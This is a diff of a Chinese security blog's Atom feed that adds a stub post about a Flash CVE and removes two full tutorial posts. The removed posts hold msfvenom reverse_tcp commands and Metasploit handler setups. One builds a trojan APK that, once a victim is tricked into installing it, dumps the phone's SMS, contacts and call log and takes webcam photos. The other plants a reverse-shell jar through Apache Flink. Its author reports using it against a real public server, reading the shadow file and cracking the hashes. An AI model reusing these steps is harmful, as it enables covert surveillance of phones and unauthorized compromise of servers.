@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://sherlocz.github.io/"/>
-  <updated>2020-02-08T14:11:33.852Z</updated>
+  <updated>2020-02-15T06:03:12.931Z</updated>
   <id>http://sherlocz.github.io/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CVE-2018-4878 Flash漏洞复现</title>
+    <link href="http://sherlocz.github.io/2020/02/15/CVE-2018-4878-Flash%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    <id>http://sherlocz.github.io/2020/02/15/CVE-2018-4878-Flash漏洞复现/</id>
+    <published>2020-02-15T06:02:03.000Z</published>
+    <updated>2020-02-15T06:03:12.931Z</updated>
+    
+    <content type="html"><![CDATA[<p>最近做项目要自闭了，啥漏洞都挖不出来，太菜了，哎~</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;最近做项目要自闭了，啥漏洞都挖不出来，太菜了，哎~&lt;/p&gt;
+
+      
+    
+    </summary>
+    
+    
+    
+      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+  </entry>
   
   <entry>
     <title>对于乙方安全职业发展方向的思考</title>
@@ -352,6 +377,21 @@
   </entry>
   
   <entry>
+    <title>post</title>
+    <link href="http://sherlocz.github.io/2019/12/03/post/"/>
+    <id>http://sherlocz.github.io/2019/12/03/post/</id>
+    <published>2019-12-03T07:46:10.000Z</published>
+    <updated>2019-12-03T07:46:10.885Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
     <title>Weblogic反序列化漏洞复现(CNVD-C-2019-48814)</title>
     <link href="http://sherlocz.github.io/2019/11/25/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CNVD-C-2019-48814/"/>
     <id>http://sherlocz.github.io/2019/11/25/Weblogic反序列化漏洞复现-CNVD-C-2019-48814/</id>
@@ -435,48 +475,6 @@
     
     
       <category term="代码审计" scheme="http://sherlocz.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>利用msf渗透Android手机</title>
-    <link href="http://sherlocz.github.io/2019/11/18/%E5%88%A9%E7%94%A8msf%E6%B8%97%E9%80%8FAndroid%E6%89%8B%E6%9C%BA/"/>
-    <id>http://sherlocz.github.io/2019/11/18/利用msf渗透Android手机/</id>
-    <published>2019-11-18T05:48:18.000Z</published>
-    <updated>2020-01-13T04:48:52.686Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>Kali:172.16.28.153<br>Android:172.16.28.158</p><a id="more"></a><p>首先用Msfvenom生成一个apk木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=172.16.105.184 LPORT=4444 R &gt; /root/apk.apk</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/18/利用msf渗透Android手机/apk.png" alt></p><p>然后msfconsole设置监听(默认监听端口4444)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload android/meterpreter/reverse_tcp</span><br><span class="line">set lhost 172.16.28.153</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><p>想办法让受害者点击这个木马apk，这里没有做免杀，手机肯定会报出病毒的警告</p><p><img src="/2019/11/18/利用msf渗透Android手机/meterpreter.png" alt></p><p>我们会拿到一个meterpreter，这里可以输入 help/? 来查看我们能够输入的命令<br><img src="/2019/11/18/利用msf渗透Android手机/core.png" alt></p><p>我们来测试几条经常使用的命令：<br>check_root //检测是否为root权限<br><img src="/2019/11/18/利用msf渗透Android手机/root.png" alt></p><p>webcam_snap    //通过摄像头拍照<br><img src="/2019/11/18/利用msf渗透Android手机/snap.png" alt></p><p>dump_calllog    //导出通话记录<br><img src="/2019/11/18/利用msf渗透Android手机/calllog.png" alt><br><img src="/2019/11/18/利用msf渗透Android手机/call.png" alt></p><p>dump_contacts    //导出通讯录<br><img src="/2019/11/18/利用msf渗透Android手机/concat.png" alt><br><img src="/2019/11/18/利用msf渗透Android手机/contact.png" alt></p><p>dump_sms    //导出短信内容<br><img src="/2019/11/18/利用msf渗透Android手机/sms.png" alt><br><img src="/2019/11/18/利用msf渗透Android手机/sms2.png" alt></p><p>app_list    //列出安装的app<br><img src="/2019/11/18/利用msf渗透Android手机/app.png" alt></p><p>还可以实时开启监控等命令，这里就不一一研究了</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;实验环境&quot;&gt;&lt;a href=&quot;#实验环境&quot; class=&quot;headerlink&quot; title=&quot;实验环境&quot;&gt;&lt;/a&gt;实验环境&lt;/h1&gt;&lt;p&gt;Kali:172.16.28.153&lt;br&gt;Android:172.16.28.158&lt;/p&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="msf" scheme="http://sherlocz.github.io/tags/msf/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Apache Flink Jar包上传getshell漏洞</title>
-    <link href="http://sherlocz.github.io/2019/11/14/Apache-Flink-Jar%E5%8C%85%E4%B8%8A%E4%BC%A0getshell%E6%BC%8F%E6%B4%9E/"/>
-    <id>http://sherlocz.github.io/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/</id>
-    <published>2019-11-14T10:35:46.000Z</published>
-    <updated>2020-01-13T04:48:58.427Z</updated>
-    
-    <content type="html"><![CDATA[<p>Apache Flink下载地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mirrors.tuna.tsinghua.edu.cn/apache/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>解压，进入bin目录，运行start-cluster.sh<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/start.png" alt></p><p>访问 <a href="http://ip:8081" target="_blank" rel="noopener">http://ip:8081</a></p><p><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/dashboard.png" alt></p><p>Kali启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=4444 -f jar &gt; rce.jar</span><br></pre></td></tr></table></figure></p><p>生成jar文件木马，上传<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/submit.png" alt></p><p>msf打开监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload java/shell/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.128</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><p>点击控制台里面的submit，看见shell反弹回来啦<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/shell.png" alt></p><p>不过msf这里只有内网环境，刚好前两天小伙伴分享了frp内网穿透，就去配置了一下，然后在公网上找到了一个可以利用的点<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/ip.png" alt></p><p>还尼玛是root权限，这个漏洞危害真的高，可惜公网数量太少了<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/shadow.png" alt></p><p>看到hash之后，用Kali下的john爆破</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;Apache Flink下载地址：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;https://mirrors.tuna.tsinghua.edu.cn/apache/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
     
   </entry>
   
